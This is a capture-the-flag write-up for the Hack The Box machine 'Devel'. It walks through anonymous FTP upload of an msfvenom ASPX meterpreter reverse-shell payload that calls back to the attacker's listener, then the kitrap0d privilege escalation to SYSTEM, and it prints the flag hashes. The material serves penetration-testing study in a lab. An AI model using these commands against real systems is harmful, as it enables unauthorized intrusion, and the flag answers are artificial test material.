# Devel

## IP

> 10.10.10.5
## nmap Scan
```
nmap -T4 -A 10.10.10.5 -Pn
```

![Image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Hack%20The%20Box/Devel/Pasted%20image%2020210729233357.png)

## Open Ports
       
>
21/tcp open  ftp     Microsoft ftpd

FTP
Anonymous FTP login allowed (FTP code 230)

>80/tcp open  http    Microsoft IIS httpd 7.5

HTTP

## FTP 
You can access the FTP using anonymous access

```
ftp 10.10.10.5
user: anonymous
no password
```

We can see that here they are storing the website assets

## HTTP
http://10.10.10.5/

![[Pasted image 20210729233357.png]]

I first performed a dirbuster using the small wordlist and the extensions "txt,asm,asmx,asp,aspx,zip,rar,bar" 

> Nothing Useful

## HTTP & FTP
FTP is being used to store the assets for the http page

So we can create a payload in order to try and create a backdoor

We can find a cheat sheet here on how to do it https://netsec.ws/?p=331

We are looking to create a aspx payload because we are attacking windows

Following the guide we end up with this command

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.185 LPORT=4444 -f aspx > ex.aspx
```

We created the payload

Now we need to create the listener

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.16.185
run
```

Now we have the listener

We can now connect into FTP again 

```
ftp 10.10.10.5
user: anonymous
no password
```

And put the file

```
put ex.aspx
```

Now if we access http://10.10.10.5/ex.aspx we get access in our listener!!

## Post Exploitation 
```getuid```

> Server username: IIS APPPOOL\Web

We are not root

```sysinfo```

>Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows

Compatibility between Meterpreter and Architecture = Good

```getsystem```

> Did not work

## Getting root access

First Background the session

```background```

Then look for the exploit

```
search suggester
use post/multi/recon/local_exploit_suggester
set session 1 (or whichever session you are using)
run
```

Now we try recommended payloads until it works

This time it was "exploit/windows/local/ms10_015_kitrap0d"

```
use exploit/windows/local/ms10_015_kitrap0d
set session 1 (or whichever session you are using)
run
```

After the first run it wont work, but we can now change more options

```
set lhost tun0
run
```

```getuid```
> Server username: NT AUTHORITY\SYSTEM

We are root!

#### Finding user.txt

```
cd c:\
cd Users
cd babis
cd Desktop
type user.txt.txt
```

>
9ecdd6a3aedf24b41562fea70f4cb3e8

#### Finding root.txt

```
cd c:\
cd Users
cd Administrator
cd Desktop
type root.txt
```

>
e621a0b5041708797c4fc4728bc72b4b
